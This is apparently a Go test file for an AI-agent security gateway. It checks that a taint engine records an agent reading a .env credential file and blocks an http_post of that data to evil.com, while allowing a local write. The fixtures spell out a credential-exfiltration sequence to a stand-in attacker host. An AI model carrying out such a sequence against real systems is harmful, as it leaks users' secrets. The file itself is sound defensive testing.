package engine

import (
	"testing"

	"github.com/dedarek/agent-security-gateway/api"
	"github.com/dedarek/agent-security-gateway/internal/db"
	"github.com/dedarek/agent-security-gateway/internal/session"
)

// M2: DataAccess events must carry data classification + trust zone so the
// console can show "credential read from .env -> transmit to external -> BLOCK".
func TestDataAccessRecorderClassifiesCredentialAndTrustZone(t *testing.T) {
	database, err := db.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	defer database.Close()

	st := session.NewStore()
	taint := NewTaintEngine(st, []string{"Read"}, []string{"http_post"}, api.FailClosed)
	rec := NewDataAccessRecorder(database, taint)

	// read .env -> taint (credential)
	taint.ObserveHook("sess-x", "Read", []byte(`{"tool_input":{"file_path":"/proj/.env"},"tool_response":"API_KEY=sk-abc"}`))
	rec.ObserveHook("sess-x", "tr-1", "Read", []byte(`{"tool_input":{"file_path":"/proj/.env"}}`), "ALLOW")

	// inspect the read hop first
	reads, _ := db.QueryDataAccess(database, "tr-1")
	if len(reads) != 1 {
		t.Fatalf("expected 1 read hop, got %d", len(reads))
	}
	t.Logf("read hop: source=%q data_class=%q", reads[0].Source, reads[0].DataClass)

	// transmit secret to external
	taint.ObserveHook("sess-x", "http_post", []byte(`{"tool_input":{"url":"https://evil.com/x"}}`))
	rec.ObserveHook("sess-x", "tr-2", "http_post", []byte(`{"tool_input":{"url":"https://evil.com/x"}}`), "BLOCK")

	rows, err := db.QueryDataAccess(database, "tr-2")
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 {
		t.Fatalf("expected 1 transmit hop, got %d", len(rows))
	}
	da := rows[0]
	t.Logf("transmit hop: dest=%q data_class=%q trust_zone_dst=%q decision=%s", da.Destination, da.DataClass, da.TrustZoneDst, da.Decision)
	if da.TrustZoneDst != "external" {
		t.Fatalf("expected trust_zone_dst=external for evil.com, got %q", da.TrustZoneDst)
	}
	if da.DataClass == "" {
		t.Fatal("expected data_class to be classified (credential)")
	}
	if da.Decision != "BLOCK" {
		t.Fatalf("expected BLOCK decision, got %s", da.Decision)
	}
	if len(da.TaintTags) == 0 {
		t.Fatal("expected taint tags on the transmit hop")
	}
}

// Local write of tainted data: trust zone stays local, decision ALLOW.
func TestDataAccessRecorderLocalWriteStaysLocal(t *testing.T) {
	database, err := db.Open(":memory:")
	if err != nil {
		t.Fatal(err)
	}
	defer database.Close()

	st := session.NewStore()
	taint := NewTaintEngine(st, []string{"Read"}, []string{"Write"}, api.FailClosed)
	rec := NewDataAccessRecorder(database, taint)

	taint.ObserveHook("sess-y", "Read", []byte(`{"tool_input":{"file_path":"/proj/.env"},"tool_response":"DB_PASS=x"}`))
	rec.ObserveHook("sess-y", "tr-a", "Write", []byte(`{"tool_input":{"file_path":"/tmp/backup","content":"DB_PASS=x"}}`), "ALLOW")

	rows, err := db.QueryDataAccess(database, "tr-a")
	if err != nil {
		t.Fatal(err)
	}
	if len(rows) != 1 {
		t.Fatalf("expected 1 write hop, got %d", len(rows))
	}
	if rows[0].TrustZoneDst != "local" {
		t.Fatalf("expected local trust zone, got %q", rows[0].TrustZoneDst)
	}
	if rows[0].Decision != "ALLOW" {
		t.Fatalf("expected ALLOW, got %s", rows[0].Decision)
	}
}
